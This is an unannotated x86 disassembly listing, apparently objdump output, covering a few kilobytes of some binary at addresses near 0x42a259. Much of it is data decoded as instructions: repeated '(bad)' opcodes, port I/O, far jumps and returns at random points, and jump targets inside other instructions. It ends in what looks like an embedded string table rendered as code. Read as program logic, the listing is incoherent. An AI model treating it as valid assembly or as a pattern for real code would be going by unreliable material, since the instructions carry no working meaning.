  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
